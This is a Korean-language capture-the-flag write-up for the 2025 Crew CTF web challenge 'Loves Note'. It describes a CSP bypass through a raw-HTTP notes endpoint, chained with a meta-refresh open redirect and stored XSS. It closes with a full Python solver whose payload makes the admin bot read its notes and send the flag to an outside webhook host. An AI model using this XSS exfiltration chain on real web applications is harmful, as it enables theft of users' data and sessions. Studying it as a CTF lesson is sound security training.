---
title: 2025 Crew CTF - Loves Note
published: 2025-09-26
description: " "
tags: [CTF, crewctf]
category: CTF
draft: false
---
## TL;DR
meta 기반 Open Redirect와 XSS를 통해 CSP가 없는 게시글로 봇을 유도, admin 게시글에 있는 flag를 탈취하는 문제이다.

## Description

로그인하면 notes를 작성할 수 있는 페이지와, 리포트 기능이 존재한다는 걸 알 수 있다.

```js
const reviewNote = async (reviewNoteId) => {
    const showNoteDiv = document.getElementById('show-note');
    const response = await fetch(`/api/notes/`+reviewNoteId)
    const note = await response.text();
    showNoteDiv.style.display = 'block';
    
    showNoteDiv.innerHTML = `
        <h3>Note ID: ${reviewNoteId}</h3>
        <p>${note}</p>
    `;
}
```

```js
// Review note
await sleep(2000);
try{
    await page.goto(HOSTNAME + '/dashboard?reviewNote='+noteId);
} catch(error) {
    console.log(error);
}
await sleep(2000);
try{page.close()} catch{};
```

봇은 `?reviewNote`를 사용해 게시글을 읽어온다.

```js
res.setHeader('Content-Security-Policy', `script-src ${HOSTNAME}/static/dashboard.js https://js.hcaptcha.com/1/api.js; style-src ${HOSTNAME}/static/; img-src 'none'; connect-src 'self'; media-src 'none'; object-src 'none'; prefetch-src 'none'; frame-ancestors 'none'; form-action 'self'; frame-src 'none';`);
```

전역적으로 CSP 정책이 엄격하게 설정되어 있어 바로 flag를 획득하는 건 불가능하지만, `/api/notes/{noteId}`에서 취약점이 발생한다.

```js
// Look mom, I wrote a raw HTTP response all by myself!
// Can I go outside now and play with my friends?
const responseMessage = `HTTP/1.1 200 OK
Date: Sun, 7 Nov 1917 11:26:07 GMT
Last-Modified: the-second-you-blinked
Type: flag-extra-salty, thanks
Length: 1337 bytes of pain
Server: thehackerscrew/1970 
Cache-Control: never-ever-cache-this
Allow: pizza, hugs, high-fives
X-CTF-Player-Reminder: drink-water-and-keep-hydrated

${note.title}: ${note.content}

`
res.socket.end(responseMessage)
```

`/api/notes/{noteId}` 라우트는 서버에서 Raw HTTP 패킷을 직접 만들어 응답을 보내는데, `responseMessage`에서 어떠한 CSP 헤더도 설정되어 있지 않기에 문제 없이 인라인 스크립트를 실행할 수 있다.

다음과 같은 방법으로 플래그를 leak한다.
1. `/dashboard?reviewNote`에서 `/api/notes/{noteId}`로의 Meta tag Open Redirect
2. XSS를 통한 웹훅 서버로의 전송

필자는 `/api/notes`에서 플래그를 파싱해 보내는 방법을 사용했다.

## Solver
```py
import requests

r = requests.Session()

url = 'https://inst-ca0cfd06b8022715-love-notes.chal.crewc.tf'
webhook = 'https://vuebjrp.request.dreamhack.games'

def save_note(title, content):
  res = r.post(f'{url}/api/notes', data = { "title": title, "content": content })
  return res.json()

def register():
  res = r.post(f'{url}/api/auth/register', data = { "email": "test", "password": "test" })
  print(res.text)

def login():
  res = r.post(f'{url}/api/auth/login', data = { "email": "test", "password": "test" })
  print(res.text)

def report(note_id):
  res = r.post(f'{url}/report', data = { "noteId": note_id })
  print(res.text)

register()
login()

# Script file save
payload = f'fetch("/api/notes/").then(r => r.text()).then(rtext => location.href = "{webhook}?q=" + "crew" + (rtext.split("crew")[1].split("}}")[0]) + "}}")//'
script_note_id = save_note(payload, '//')['id']

# Get Script file
script_note_id_2 = save_note(f'<script src="{url}/api/notes/{script_note_id}"></script>', 'test1')['id']

# ?reviewNote open redirect -> script -> execute
open_redirect = save_note(f'<html><meta http-equiv="refresh" content="0; url=/api/notes/{script_note_id_2} "/></html>', 'test2')['id']

report(open_redirect)
```
